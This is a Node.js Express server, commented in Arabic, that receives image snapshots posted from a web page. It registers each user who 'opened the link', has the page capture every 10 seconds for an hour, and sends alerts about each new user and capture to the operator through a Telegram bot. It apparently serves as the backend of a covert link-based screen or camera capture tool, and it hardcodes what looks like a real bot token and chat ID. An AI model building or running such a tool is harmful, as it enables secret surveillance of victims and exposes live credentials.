const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// إعدادات Telegram
const TOKEN = process.env.TOKEN || "8443250456:AAGNQosCkvy7uMb6ciA4p0EbQkFRStSVjqc";
const YOUR_ID = process.env.YOUR_ID || "1197734466";
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;

// Middleware
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// تخزين الجلسات
let activeSessions = {};

// 1. استقبال لقطات من صفحة الويب
app.post('/capture', async (req, res) => {
    try {
        const { user_id, image, count } = req.body;
        
        if (!user_id || !image) {
            return res.json({ status: 'error', message: 'بيانات ناقصة' });
        }

        // إرسال إشعار للمطور
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: YOUR_ID,
            text: `📸 لقطة جديدة #${count}\n👤 من: ${user_id}\n⏰ ${new Date().toLocaleTimeString()}`
        });

        // حفظ بيانات الجلسة
        if (!activeSessions[user_id]) {
            activeSessions[user_id] = { count: 0 };
        }
        activeSessions[user_id].count = count;
        activeSessions[user_id].lastSeen = new Date();

        res.json({ status: 'success', received: true });
    } catch (error) {
        console.error('خطأ في /capture:', error);
        res.json({ status: 'error', message: error.message });
    }
});

// 2. تسجيل مستخدم جديد
app.post('/register', (req, res) => {
    try {
        const { user_id, username, first_name } = req.body;
        
        activeSessions[user_id] = {
            username: username || 'مجهول',
            first_name: first_name || 'مستخدم',
            start_time: new Date(),
            count: 0
        };

        // إشعار المطور
        axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: YOUR_ID,
            text: `🚨 مستخدم جديد!\n👤 ${first_name}\n🆔 ${user_id}\n🌐 فتح الرابط`
        });

        res.json({
            status: 'success',
            interval: 10000,
            duration: 3600000
        });
    } catch (error) {
        res.json({ status: 'error', message: error.message });
    }
});

// 3. صفحة الاختبار
app.get('/', (req, res) => {
    res.send(`
        <h1>خادم التقاط الشاشة يعمل ✅</h1>
        <p>الجلسات النشطة: ${Object.keys(activeSessions).length}</p>
        <p>الوقت: ${new Date().toLocaleString()}</p>
    `);
});

// 4. عرض الجلسات النشطة
app.get('/active', (req, res) => {
    res.json({
        count: Object.keys(activeSessions).length,
        sessions: activeSessions
    });
});

// 5. إيقاف جلسة
app.post('/stop', (req, res) => {
    const { user_id } = req.body;
    if (activeSessions[user_id]) {
        delete activeSessions[user_id];
    }
    res.json({ status: 'success' });
});

// تشغيل الخادم
app.listen(PORT, () => {
    console.log(`✅ الخادم يعمل على المنفذ: ${PORT}`);
    console.log(`📡 رابط الويب: http://localhost:${PORT}`);
});

// تنظيف الجلسات القديمة كل ساعة
setInterval(() => {
    const now = new Date();
    for (const userId in activeSessions) {
        if (now - activeSessions[userId].lastSeen > 3600000) { // ساعة
            delete activeSessions[userId];
        }
    }
}, 3600000);